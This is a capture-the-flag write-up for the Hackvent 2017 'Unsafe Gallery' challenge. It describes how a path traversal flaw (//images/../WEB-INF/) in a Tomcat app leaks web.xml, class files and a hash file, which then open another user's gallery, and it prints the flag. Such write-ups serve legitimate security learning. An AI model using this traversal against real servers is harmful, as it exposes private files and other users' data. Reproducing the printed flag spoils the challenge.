Day 15: Unsafe Gallery
======================
> *See pictures you shouldn't see*
> 
> The List of all Users of the Unsafe Gallery was leaked (See account list).
> With this list the URL to each gallery can be constructed. E.g. you find Danny's gallery here.
> 
> Now find the flag in Thumper's gallery.

Here we got a CSV file that was useless for me in the end (but costed me a lot of time). And the URL to a gallery: <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw>

When browsing the gallery and trying to fiddle with the URL, we notice the double slash that is required to access a picture, for example in <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw//images/tunnel.jpg> This hints already at some issue in the web server configuration. Then when playing a bit more one can find an HTTP 500 error message at <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw//images> that includes the following:
```
<h1>HTTP Status 500 - String index out of range: -1</h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u>String index out of range: -1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.lang.StringIndexOutOfBoundsException: String index out of range: -1
	java.lang.String.substring(String.java:1927)
	ch.dkuhn.hackvent2017.gallery.filter.HashFilter.doFilter(HashFilter.java:65)
</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.82 logs.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.82</h3>
```

So we have a Tomcat with some Java application and some issue with the routing of the requests or some parsing here. Fiddling a bit more and with some payload lists we can get to the very interesting point, a local file inclusion, querying this URL <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw//images/../WEB-INF/web.xml> actually returns the `web.xml` file for the application. Interestingly this doesn't work in a browser or wiht wget or curl. They all strip the `/images/../` part and LFI is not triggered. Once we have this it's only a matter of minutes to access the previously found class `ch.dkuhn.hackvent2017.gallery.filter.HashFilter` using the URL <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw//images/../WEB-INF/classes/ch/dkuhn/hackvent2017/gallery/filter/HashFilter.class>

Analysing this class using a decompiler reveals the following custom imports:
```
import ch.dkuhn.hackvent2017.gallery.Gallery;
import ch.dkuhn.hackvent2017.gallery.ImageService;
import ch.dkuhn.hackvent2017.gallery.UserService;
import ch.dkuhn.hackvent2017.gallery.model.User;
```

As well as the ID of our Thumper:
```
  private static final int ID_OF_THUMPER = 38852;
```

And a call to a `getHash` function that looks interesting:
```
    User u = UserService.getUser(hash);
```

Then we read the code of the `UserService` class in the same way as before to find how the hash is calculated:
```
    File file = new File(classLoader.getResource("hashes.csv").getFile());
```

And this is a surprise, it seems that the hash is actually loaded from a file. And since we have a local file inclusion we can use it to read the file at this URL <http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw//images/../WEB-INF/classes/hashes.csv> And in this file we find the line corresponding to Thumper using the ID 38852:
```
38852,Thumper,silver,active,37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw=,7
```

Then we can simply remove the trailing `=` at the end to have the hash and use it in the URL <http://challenges.hackvent.hacking-lab.com:3958/gallery/37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw> and the flag is displayed in the gallery comments:
```
HV17-el2S-0Td5-XcFi-6Wjg-J5aB
```
